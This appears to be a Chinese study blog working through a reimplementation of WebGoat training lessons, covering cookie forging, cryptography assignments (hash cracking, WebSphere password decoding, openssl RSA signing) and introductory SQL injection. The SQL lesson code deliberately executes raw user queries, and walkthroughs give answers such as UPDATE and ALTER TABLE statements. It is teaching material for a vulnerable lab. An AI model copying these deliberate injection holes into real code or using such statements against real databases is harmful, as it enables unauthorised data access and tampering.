![image-20220903104149969](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220903104149969.png)

可以简单发现前面是 用户名 后面是一个固定值

加密cookie

![image-20220903104310909](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220903104310909.png)

![image-20220903104326774](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220903104326774.png)

![image-20220903104337933](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220903104337933.png)

更改cookie登录

![image-20220903104800000](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220903104800000.png)

## cryptography

### EncodingAssignment

需要先完成 HashingAssignment该部分编写 

![image-20220903133231225](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220903133231225.png)

```java
package com.wanan.webgoat.lessons.cryptography;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;

import java.util.Base64;
import java.util.Random;

@RestController
public class EncodingAssignment extends AssignmentEndpoint {
    public static String getBasicAuth(String username,String password){
        return Base64.getEncoder().encodeToString(username.concat(":").concat(password).getBytes());
//        获取认证 首先将用户名和 密码进行拼接 接着编码为 base64
    }
    @GetMapping(path = "/crypto.encoding/basic",produces = MediaType.TEXT_HTML_VALUE)
//    生产html字符
    @ResponseBody
    public String getBasicAuth(HttpServletRequest request){
        String basicAuth = (String) request.getSession().getAttribute("basicAuth");
//        从session中获取值
        String username = request.getUserPrincipal().getName();
//      获取当前登录的用户名
        if (basicAuth == null){
//            如果 认证为空
            String password = HashingAssignment.SECRETS[new Random().nextInt(HashingAssignment.SECRETS.length)];
//            从常量中随机挑选一个作为密码
            basicAuth = getBasicAuth(username,password);
//            获取base64值
            request.getSession().setAttribute("basicAuth",basicAuth);
//            添加到session中去
        }
        return "Authorization: Basic ".concat(basicAuth);
    }
    @PostMapping("/crypto/encoding/basic-auth")
    @ResponseBody
    public AttackResult completed(HttpServletRequest request,
                                  @RequestParam String answer_user,
                                  @RequestParam String answer_pwd){
        String basicAuth = (String) request.getSession().getAttribute("basicAuth");
        if (basicAuth != null && answer_user != null && answer_pwd != null && basicAuth.equals(getBasicAuth(answer_user,answer_pwd))){
//            如果 base 不为空 并且 answer不为空 并且与base64相等
            return success(this)
                    .feedback("crypto-encoding.success")
                    .build();
        }else {
            return failed(this).feedback("crypto-encoding.empty").build();
        }
    }
}
```

![image-20220903133620704](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220903133620704.png)

![image-20220903133644095](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220903133644095.png)

### XOREncodingAssignment

```java
package com.wanan.webgoat.lessons.cryptography;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

@RestController
@AssignmentHints({"crypto-encoding-xor.hints.1"})
public class XOREncodingAssignment extends AssignmentEndpoint {
    @PostMapping("/crypto/encoding/xor")
    @ResponseBody
    public AttackResult completed(@RequestParam String answer_pwd1){
        if (answer_pwd1 != null && answer_pwd1.equals("databasepassword")){
//            简单的进行字符串的对比
            return success(this)
                    .feedback("crypto-encoding-xor.empty")
                    .build();
        }
        return failed(this)
                .feedback("crypto-encoding-xor.empty")
                .build();
    }
}
```

![image-20220905190857076](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220905190857076.png)

这里其实考察的是 webSphere 解密

![image-20220905191051993](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220905191051993.png)

这里我找到了这个网站

http://www.sysman.nl/wasdecoder/

先进行base64解密在 解密一次即可

![image-20220905191233290](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220905191233290.png)

![image-20220905191549601](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220905191549601.png)

### HashingAssignment

```java
package com.wanan.webgoat.lessons.cryptography;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import javax.xml.bind.DatatypeConverter;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;
import java.sql.DataTruncation;
import java.util.Locale;
import java.util.Random;
@RestController
@AssignmentHints({"crypto-hashing.hints.1","crypto-hashing.hints.2"})
public class HashingAssignment extends AssignmentEndpoint {
    public static final String [] SECRETS = {"secret","admin","password","123456","passw0rd"};

    @RequestMapping(path = "/crypto/hashing/md5",produces = MediaType.TEXT_HTML_VALUE)
//    这里是返回文本
    @ResponseBody
    public String getMd5(HttpServletRequest request) throws NoSuchAlgorithmException{
//当请求特定加密算法但在环境中不可用时，抛出此异常
        String md5Hash = (String) request.getSession().getAttribute("md5Hash");
//        获取session中的md5Hash
        if (md5Hash == null){
//            如果获取到是空
            String secret = SECRETS[new Random().nextInt(SECRETS.length)];
//            就通过密钥随机生成一个
            MessageDigest md = MessageDigest.getInstance("MD5");
//            获取一个md5 加密对象 因为是单例的所以直接获取 应该是单例吧
            md.update(secret.getBytes());
//            将得到的字符串进去处理一下
            byte[] digest = md.digest();
//            获取一个byte数组
            md5Hash = DatatypeConverter
                    .printHexBinary(digest).toUpperCase();
//          通过java工具类将字节数组转换成 str 接着 转换成大写
            request.getSession().setAttribute("md5Hash",md5Hash);
//            密文和明文都放入session
            request.getSession().setAttribute("md5Secret",secret);
//
        }
        return md5Hash;
    }
    @RequestMapping(path = "/crypto/hashing/sha256",produces = MediaType.TEXT_HTML_VALUE)
    @ResponseBody
    public String getSha256(HttpServletRequest request) throws NoSuchAlgorithmException{
//        同样先判断session中有无
        String sha256 = (String) request.getSession().getAttribute("sha256");
        if (sha256 == null){
            String secret = SECRETS[new Random().nextInt(SECRETS.length)];
//            获取明文
            sha256 = getHash(secret,"SHA-256");
//            通过 下面的getHash 获取 密文
            request.getSession().setAttribute("sha256Hash",sha256);
            request.getSession().setAttribute("sha256Secret",secret);
        }
        return sha256;
    }

    @PostMapping("/crypto/hashing")
    @ResponseBody
    public AttackResult completed(HttpServletRequest request,
                                  @RequestParam String answer_pwd1,
                                  @RequestParam String answer_pwd2){
        String  md5Secret = (String) request.getSession().getAttribute("md5Secret");
        String sha256Secret = (String) request.getSession().getAttribute("sha256Secret");
//      简单判断
        if (answer_pwd1 != null && answer_pwd2 != null){
            if (answer_pwd1.equals(md5Secret)
                && answer_pwd2.equals(sha256Secret)){
                return success(this)
                        .feedback("crypto-hashing.success")
                        .build();
            }else if (answer_pwd1.equals(md5Secret) || answer_pwd2.equals(sha256Secret)){
                return failed(this).feedback("crypto-hashing.oneok").build();
            }
        }
        return failed(this).feedback("crypto-hashing.empty").build();
    }



    public static String getHash(String  secret,String algorithm) throws NoSuchAlgorithmException{
//        一个密文一个加密方法 剩下和上面一样
        MessageDigest md = MessageDigest.getInstance(algorithm);
        md.update(secret.getBytes());
        byte[] digest = md.digest();
        return DatatypeConverter
                .printHexBinary(digest).toUpperCase();
    }

}

```

![image-20220905220128712](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220905220128712.png)

意思就是让我们解一下明文

![image-20220905220150080](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220905220150080.png)

![image-20220905220207067](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220905220207067.png)

![image-20220905220541246](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220905220541246.png)

### SigningAssignment

```java
package com.wanan.webgoat.lessons.cryptography;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import lombok.extern.slf4j.Slf4j;
import org.springframework.http.MediaType;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletRequest;
import javax.xml.bind.DatatypeConverter;
import java.security.InvalidAlgorithmParameterException;
import java.security.KeyPair;
import java.security.NoSuchAlgorithmException;
import java.security.interfaces.RSAPublicKey;

@RestController
@AssignmentHints({"crypto-signing.hints.1","crypto-signing.hints.2", "crypto-signing.hints.3", "crypto-signing.hints.4"})
@Slf4j
public class SigningAssignment extends AssignmentEndpoint {
    @RequestMapping(path = "/crypto/signing/getprivate",produces = MediaType.TEXT_HTML_VALUE)
    @ResponseBody
    public String getPrivateKey(HttpServletRequest request) throws NoSuchAlgorithmException, InvalidAlgorithmParameterException{
        String privateKey = (String) request.getSession().getAttribute("privateKeyString");
        if (privateKey == null){
            KeyPair keyPair = CryptoUtil.generateKeyPair();
//            首先生成密钥对
            privateKey = CryptoUtil.getPrivateKeyInPEM(keyPair);
//            生成可以发送的密钥 也就是前后添加规范字符
            request.getSession().setAttribute("privateKeyString",privateKey);
            request.getSession().setAttribute("keyPair",keyPair);
        }
        return privateKey;
    }

    @PostMapping("/crypto/signing/verify")
    @ResponseBody
    public AttackResult completed(HttpServletRequest request,
                                  @RequestParam String modulus,
                                  @RequestParam String signature){
        String tempModulus = modulus;
        KeyPair keyPair = (KeyPair) request.getSession().getAttribute("keyPair");
        RSAPublicKey rsaPublicKey = (RSAPublicKey) keyPair.getPublic();
//        获取公钥
        if (tempModulus.length() == 512){
            tempModulus = "00".concat(tempModulus);
//            如果长度是512 就用00去拼接
        }
        if (!DatatypeConverter.printHexBinary(rsaPublicKey.getModulus().toByteArray()).equals(tempModulus.toUpperCase())){
//            如果获取公钥的16进制 等于tempModulus
            log.warn("modulus {} incorrect",modulus);
            return failed(this).feedback("crypto-signing.modulusnotok").build();
        }
        if (CryptoUtil.verifyAssignment(modulus,signature,keyPair.getPublic())){
//            如果起签名验证正确
            return success(this).feedback("crypto-signing.success").build();
        }else {
            log.warn("signature incorrect");
            return failed(this).feedback("crypto-signing.notok").build();
        }
    }

}
```

### CryptoUtil

```java
package com.wanan.webgoat.lessons.cryptography;

import lombok.extern.slf4j.Slf4j;

import javax.xml.bind.DatatypeConverter;
import java.io.UnsupportedEncodingException;
import java.math.BigInteger;
import java.nio.charset.Charset;
import java.security.*;
import java.security.interfaces.RSAPublicKey;
import java.security.spec.InvalidKeySpecException;
import java.security.spec.PKCS8EncodedKeySpec;
import java.security.spec.RSAKeyGenParameterSpec;
import java.util.Base64;
import java.util.Random;

@Slf4j
public class CryptoUtil {
    private static final BigInteger[] FERMAT_PRIMS = {
            BigInteger.valueOf(3),
            BigInteger.valueOf(5),
            BigInteger.valueOf(17),
            BigInteger.valueOf(257),
            BigInteger.valueOf(65537)
    };

    public static KeyPair generateKeyPair() throws NoSuchAlgorithmException, InvalidAlgorithmParameterException {
        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("RSA");
//      KeyPairGenerator 用于生成一个RSA 密钥对
        RSAKeyGenParameterSpec kpgSpec = new RSAKeyGenParameterSpec(2048, FERMAT_PRIMS[new Random().nextInt(FERMAT_PRIMS.length)]);
//      这里是通过 RSAKeyGenParameterSpec 指定用于生成密钥的参数集
        keyPairGenerator.initialize(kpgSpec);
//        将参数集传入进去
        return keyPairGenerator.generateKeyPair();
//        生成密钥对的简单持有者 目的是用于暂存 密钥对?
    }

    public static String getPrivateKeyInPEM(KeyPair keyPair) {
        String encodedString = "-----BEGIN PRIVATE KEY-----\n";
        encodedString = encodedString + new String(Base64.getEncoder().encode(keyPair.getPrivate().getEncoded()), Charset.forName("UTF-8")) + "\n";
//        这里是对密钥进行拼接 生成私钥 上面的方法生成的 KeyPair 在这里 取到了里面的私钥
        encodedString = encodedString + "-----END PRIVATE KEY-----\n";
        return encodedString;
    }

    public static String signMessage(String message, PrivateKey privateKey) {
        log.debug("start signMessage");
        String signature = null;
        try {
            Signature instance = Signature.getInstance("SHA256withRSA");
//            获取签名方法
            instance.initSign(privateKey);
//            对签名初始化
            instance.update(message.getBytes("UTF-8"));
//            将信息进行加密
            signature = new String(Base64.getEncoder().encode(instance.sign()), Charset.forName("UTF-8"));
//            对信息进行签名
            log.info("signe the signature with result:{}", signature);
        } catch (NoSuchAlgorithmException e) {
            log.info("signe the signature with result: {}", signature);
        } catch (Exception e) {
            log.error("Signature signing failed", e);
        }
        log.debug("end signMessage");
        return signature;
    }

    public static boolean verifyMessage(String message, String base64EncSignature, PublicKey publicKey) {
        log.debug("start verifyMessage");
        boolean result = false;
        base64EncSignature = base64EncSignature.replace("\r", "")
                .replace("\n", "")
                .replace(" ", "");
//        验证信息
        byte[] decodedSignature = Base64.getDecoder().decode(base64EncSignature);
//        先进行base64解码
        try {
            Signature instance = Signature.getInstance("SHA256withRSA");
            instance.initVerify(publicKey);
//          通过获取的公钥进行签名
            instance.update(message.getBytes("UTF-8"));
//            对明文进行处理
            result = instance.verify(decodedSignature);
//            进行签名
            log.info("Signature verification failed", result);
        } catch (Exception e) {
            log.error("Signature verification failed", e);
        }
        log.debug("end verifyMessage");
        return result;
    }

    public static boolean verifyAssignment(String modulus, String signature, PublicKey publicKey) {
        boolean result = false;
        if (modulus != null && signature != null) {
            result = verifyMessage(modulus, signature, publicKey);
            
            RSAPublicKey rsaPublicKey = (RSAPublicKey) publicKey;
            if (modulus.length() == 512) {
                modulus = "00".concat(modulus);
            }
            result = result && (DatatypeConverter.printHexBinary(rsaPublicKey.getModulus().toByteArray()).equals(modulus.toUpperCase()));
        }
        return result;
    }

    public static PrivateKey getPrivateKeyFromPEM(String privateKeyPem) throws NoSuchAlgorithmException, InvalidKeySpecException {
        privateKeyPem = privateKeyPem.replace("-----BEGIN PRIVATE KEY-----", "");
        privateKeyPem = privateKeyPem.replace("-----END PRIVATE KEY-----", "");
        privateKeyPem = privateKeyPem.replace("\n", "").replace("\r", "");
        byte[] decoded = Base64.getDecoder().decode(privateKeyPem);
        PKCS8EncodedKeySpec spec = new PKCS8EncodedKeySpec(decoded);
//        获取一个 pkcs8加密
        KeyFactory kf = KeyFactory.getInstance("RSA");
        
        return kf.generatePrivate(spec);
    }
}
```

![image-20220907110138212](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907110138212.png)

打开了题目是给了我们私钥 让我们去提取公钥的模数与签名

![image-20220907120305221](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907120305221.png)

将私钥存入文件pri.key 

获取对应公钥

```
 openssl rsa -in pri.key -pubout > pub.key
 rsa 表示采用rsa加密方式
 -in 表示添加要加密的文件
 -pubout 表示根据提供的私钥,从中提取出公钥
 > pub.key 表示提取出来的公钥存入文件pub.key
```

![image-20220907120212258](C:/Users/14980/AppData/Roaming/Typora/typora-user-images/image-20220907120212258.png)

获取对应的modulus

```
openssl rsa -in pub.key -pubin -modulus -noout
-pubin 表示读取的文件必须是公钥文件 
-modulus 表示提取模数 
-noout  表示不输出加密的证书内容
```

![image-20220907120426316](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907120426316.png)

获取私钥的签名

```
echo -n "98039F5125887DFB3C2C1B339AC37ADF21A3B0A57B6103905C2F318191864EFF386EE103625A928CEFECF052BDC887D65EB3505AF55E3E2B13341DD99E29AEF2D27F471B58CA619C5DFDEB57BA9F1A312CDBFEC7E2C5EDE17D8033B2F177B87B3668188B9A57AFFC12BEE4985EC281D51658DAFC097F76762AAEB953232255CAFD0317675F7345364328849C5616FD147E7557BBF4855F11CE634B7A5EE9C5CF0B0FCDC4FB2329C77885A60DE89131EC749BC7423A05BA91114C9D3C730E0B462879F8D783AE068F73CF1EDD0AECFD6B4A15BB1259F23348B36C0A9BCD2FBA1A824CAFDFDC4796E5C1E113B91B0721624AEFC5843D5B836B4797F38FE183040D" | openssl dgst -sign pri.key -sha256 -out sign.sha256
dgst 代表单向加密
-sign 代表使用私钥加密
-sha256 代表加密算法是sha256
-out sign.sha256 代表输出内容到文件
```

![image-20220907122543161](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907122543161.png)

由于是不可见字符 因此我们先进行base64加密

```
cat sign.sha256 | base64
```

![image-20220907123317981](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907123317981.png)

![image-20220907123537021](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907123537021.png)

### SecureDefaultsAssignment

```java
package com.wanan.webgoat.lessons.cryptography;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import java.security.NoSuchAlgorithmException;

@RestController
@AssignmentHints({"crypto-secure-defaults.hints.1", "crypto-secure-defaults.hints.2", "crypto-secure-defaults.hints.3"})
public class SecureDefaultsAssignment extends AssignmentEndpoint {
    @PostMapping("/crypto/secure/defaults")
    @ResponseBody
    public AttackResult completed(@RequestParam String secretFileName,
                                  @RequestParam String secretText)throws NoSuchAlgorithmException{
        if (secretFileName != null && secretFileName.equals("default_secret")){
//            如果密文文件名不为空 并且 密文文件名为 default_secret
            if (secretText!= null && HashingAssignment.getHash(secretText,"SHA-256").equalsIgnoreCase("34de66e5caf2cb69ff2bebdc1f3091ecf6296852446c718e38ebfa60e4aa75d2")){
//                如果密文不为空 并且经过SHA-256 加密后与字符串相同
                return success(this)
                        .feedback("crypto-secure-defaults.success")
                        .build();
            }else {
                return failed(this).feedback("crypto-secure-defaults.messagenotok").build();
            }
        }
        return failed(this).feedback("crypto-secure-defaults.notok").build();
    }
}
```

![image-20220907124752947](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907124752947.png)

这里说的挺清楚了 拉下docker 启动下

```
docker run -d webgoat/assignments:findthesecret
```

![image-20220907125159088](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907125159088.png)

看下容器id 并以root用户进入容器

```
docker ps
```

```
docker exec -it --user root  8e7bc8220b03 /bin/bash
```

![image-20220907125554049](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907125554049.png)

先到root目录下 接着查看文件名接着解密

```
echo "U2FsdGVkX199jgh5oANElFdtCxIEvdEvciLi+v+5loE+VCuy6Ii0b+5byb5DXp32RPmT02Ek1pf55ctQN+DHbwCPiVRfFQamDmbHBUpD7as=" | openssl enc -aes-256-cbc -d -a -k ThisIsMySecretPassw0rdF0rY0u
```

![image-20220907125934324](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907125934324.png)

![image-20220907131143402](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907131143402.png)

## sql_injection

### introduction

#### SqlInjection

```java
package com.wanan.webgoat.lessons.sql_injection.introduction;

import com.wanan.webgoat.container.lessons.Category;
import com.wanan.webgoat.container.lessons.Lesson;
import org.springframework.stereotype.Component;

@Component
public class SqlInjection extends Lesson {
    @Override
    protected Category getDefaultCategory() {
        return Category.A3;
    }

    @Override
    public String getTitle() {
        return "1.sql.injection.title";
    }
}
```

#### SqlInjectionLesson2

```java
package com.wanan.webgoat.lessons.sql_injection.introduction;

import com.wanan.webgoat.container.LessonDataSource;
import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import javax.xml.transform.Result;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

import static java.sql.ResultSet.CONCUR_READ_ONLY;
import static java.sql.ResultSet.TYPE_SCROLL_INSENSITIVE;

@RestController
@AssignmentHints(value = {"SqlStringInjectionHint2-1", "SqlStringInjectionHint2-2", "SqlStringInjectionHint2-3", "SqlStringInjectionHint2-4"})
public class SqlInjectionLesson2 extends AssignmentEndpoint {
    private final LessonDataSource dataSource;
    public SqlInjectionLesson2(LessonDataSource dataSource){
        this.dataSource = dataSource;
    }

    @PostMapping("/SqlInjection/attack2")
    @ResponseBody
    public AttackResult completed(@RequestParam String query){
//        这里传入了query参数
        return injectableQuery(query);
    }
    protected AttackResult injectableQuery(String query){
        try(var connection =  dataSource.getConnection()) {
            Statement statement = connection.createStatement(TYPE_SCROLL_INSENSITIVE,CONCUR_READ_ONLY);
            ResultSet results = statement.executeQuery(query);
//            这里对数据库的语句进行了执行
            StringBuffer output = new StringBuffer();
//            这里使用 stringBuffer 去存储信息
            results.first();
//            将光标移动到数据库的第一行
            if (results.getString("department").equals("Marketing")){
//                如果从 列名 department中获取的数据为 Marketing
                output.append("<span class='feedback-positive'>" + query + "</span>");
//                添加sql语句到html中
                output.append(SqlInjectionLesson8.generateTable(results));
//                这里是去调用 8 中的生成表的方法将结果进行 html化
                return success(this).feedback("sql-injection.2.success").output(output.toString()).build();
            }else{
                return failed(this).feedback("sql-injection.2.failed").output(output.toString()).build();
            }
        } catch (SQLException sqle) {
            return failed(this).feedback("sql-injection.2.failed")
                    .output(sqle.getMessage()).build();
        }
    }


}

```

#### SqlInjectionLesson8

```java
package com.wanan.webgoat.lessons.sql_injection.introduction;

import com.wanan.webgoat.container.assignments.AssignmentEndpoint;

import java.sql.ResultSet;
import java.sql.ResultSetMetaData;
import java.sql.SQLException;

public class SqlInjectionLesson8 extends AssignmentEndpoint {
    public static String generateTable(ResultSet results)throws SQLException{
        ResultSetMetaData  resultSetMetaData = results.getMetaData();
//        检索数据库中的数据
        int numColumns = resultSetMetaData.getColumnCount();
//        获取其中的列数
        results.beforeFirst();
//        将光标移动到第一行前面
        StringBuilder table = new StringBuilder();
//
        table.append("<table>");
        if (results.next()){
//          如果结果集中存在值
            table.append("<tr>");
            for (int i = 1; i < (numColumns + 1);i ++ ){
//                进行计数输出
                table.append("<tr>" + resultSetMetaData.getColumnName(i) + "</th>");
            }
            table.append("</tr>");
            results.beforeFirst();
//            这里也是重新回到第一个
            while (results.next()){
                table.append("<tr>");
                for (int i = 1;i< (numColumns + 1); i++ ){
//                    这里是对数据库中查到的数据进行输出
                    table.append("<td>" + results.getString(i) + "</td>");
                }
                table.append("</tr>");
            }
        }else {
            table.append("Query Successful; however no data was returned form this query.");

        }
        table.append("</table>");
        return (table.toString());
    }
}

```

![image-20220907153510840](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907153510840.png)

首先我们需要先理解一下 这个dataSource

![image-20220907153613466](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907153613466.png)

首先这里继承了DataSource 接口  这里面有一堆方法 那这些方法是干嘛的呢? 其次仔细看 这里的DataSource 是一个接口啊(接口是不能实例化的)  那接口执行的方法是谁的呢?

![image-20220907153708265](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907153708265.png)

可以看到这里传进了一个dataSource方法

![image-20220907154742560](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907154742560.png)

这里就比较好玩了 首先这里new了一个DriverManagerDataSource 众所周知 这就代表着父类对象引用指向子类多态,也就是在执行阶段是执行的DriverManagerDataSource()中的方法 那么这样的前提条件就是DriverManagerDataSource 继承了dataSource

![image-20220907154829878](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907154829878.png)

这里依次跟过去就很容易发现 确实是这样的

![image-20220907155034500](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907155034500.png)

接下来我们看到getConnection()  注意这里的两个getConnection其实并不相同的

![image-20220907155328407](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907155328407.png)

进去之后就会跳到 DataSource 里面去 这很明显不可能调用接口的方法的 因此我们从前往后找

![image-20220907155422263](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907155422263.png)

这里不存在 不要问为啥找这个类 这个是在运行的时候会调用的 java调用从子到父

![image-20220907155506896](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907155506896.png)

这里便存在了 

![image-20220907155530155](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907155530155.png)

这里就可以理解为进行了连接

![image-20220907155636967](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907155636967.png)

这里呢 是什么意思呢 很明显么 这里就是一个动态代理 不明白动态代理的 可以去看我写的反序列cc链的文章

![image-20220907155748175](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907155748175.png)

这里简单的读一下这个LessonConnectionInvocationHandler 对象 

![image-20220907161322251](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907161322251.png)

这里首先继承了 InvocationHandler 类 并且重写了这里的invoke方法,也就是代表当我们执行 任意 targetConnection 的方法之后都会执行 invoke方法  可以看到这里的invoke进行了sql 的初始化操作 完成了一些预定义的命令

![image-20220907162836126](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907162836126.png)

这里也说的比较清楚了 目的让我们去检索 bob 的部门

简单写一些sql语句即可完成

```
select department from Employees where userid= 96134
```

![image-20220907163023430](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907163023430.png)

#### SqlInjectionLesson3

```java
package com.wanan.webgoat.lessons.sql_injection.introduction;

import com.wanan.webgoat.container.LessonDataSource;
import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

@RestController
@AssignmentHints(value = {"SqlStringInjectionHint3-1", "SqlStringInjectionHint3-2"})
public class SqlInjectionLesson3 extends AssignmentEndpoint {
    private final LessonDataSource dataSource;

    public SqlInjectionLesson3(LessonDataSource dataSource){
        this.dataSource = dataSource;
    }
    @PostMapping("/SqlInjection/attack3")
    @ResponseBody
    public AttackResult completed(@RequestParam String query){
        return injectableQuery(query);
    }
    protected AttackResult injectableQuery(String query){
        try ( Connection connection = dataSource.getConnection()) {
            try (Statement statement = connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_READ_ONLY)){
                Statement checkStatement = connection.createStatement(ResultSet.TYPE_SCROLL_INSENSITIVE,ResultSet.CONCUR_READ_ONLY);
                statement.executeUpdate(query);
//                这里变成了更新语句
                ResultSet results = checkStatement.executeQuery("select * from employees where last_name='Barnett'");
                StringBuffer output = new StringBuffer();
                results.first();
                if (results.getString("department").equals("Sales")){
                    output.append("<span class='feedback-positive'>"+query + "</span>");
                    output.append(SqlInjectionLesson8.generateTable(results));
                    return success(this).output(output.toString()).build();
                }else {
                    return failed(this).output(output.toString()).build();
                }

            }catch (SQLException sqle){
                return failed(this).output(sqle.getMessage()).build();
            }

        } catch (Exception e) {
            return failed(this).output(this.getClass().getName() + " : " + e.getMessage()).build();
        }
    }
}
```

![image-20220907175202885](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907175202885.png)

这里就是将tobi barnett 的部门改了

```
update Employees set  department='Sales' where userid=89762
```

![image-20220907175142709](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907175142709.png)

#### SqlInjectionLesson4

```java
package com.wanan.webgoat.lessons.sql_injection.introduction;

import com.wanan.webgoat.container.LessonDataSource;
import com.wanan.webgoat.container.assignments.AssignmentEndpoint;
import com.wanan.webgoat.container.assignments.AssignmentHints;
import com.wanan.webgoat.container.assignments.AttackResult;
import org.springframework.web.bind.annotation.PostMapping;
import org.springframework.web.bind.annotation.RequestParam;
import org.springframework.web.bind.annotation.ResponseBody;
import org.springframework.web.bind.annotation.RestController;

import java.sql.Connection;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

import static java.sql.ResultSet.CONCUR_READ_ONLY;
import static java.sql.ResultSet.TYPE_SCROLL_INSENSITIVE;

@RestController
@AssignmentHints(value = {"SqlStringInjectionHint4-1", "SqlStringInjectionHint4-2", "SqlStringInjectionHint4-3"})
public class SqlInjectionLesson4 extends AssignmentEndpoint {

    private final LessonDataSource dataSource;

    public SqlInjectionLesson4(LessonDataSource dataSource) {
        this.dataSource = dataSource;
    }

    @PostMapping("/SqlInjection/attack4")
    @ResponseBody
    public AttackResult completed(@RequestParam String query) {
        return injectableQuery(query);
    }

    protected AttackResult injectableQuery(String query) {
        try (Connection connection = dataSource.getConnection()) {
            try (Statement statement = connection.createStatement(TYPE_SCROLL_INSENSITIVE, CONCUR_READ_ONLY)) {
                statement.executeUpdate(query);
                connection.commit();
                ResultSet results = statement.executeQuery("SELECT phone from employees;");
                StringBuffer output = new StringBuffer();
                // user completes lesson if column phone exists
                if (results.first()) {
                    output.append("<span class='feedback-positive'>" + query + "</span>");
                    return success(this).output(output.toString()).build();
                } else {
                    return failed(this).output(output.toString()).build();
                }
            } catch (SQLException sqle) {
                return failed(this).output(sqle.getMessage()).build();
            }
        } catch (Exception e) {
            return failed(this).output(this.getClass().getName() + " : " + e.getMessage()).build();
        }
    }
}
```

![image-20220907185338908](https://wanan-1310031509.cos.ap-beijing.myqcloud.com/img/image-20220907185338908.png)

添加一列数据

```
alter table employees add phone varchar(20)
```

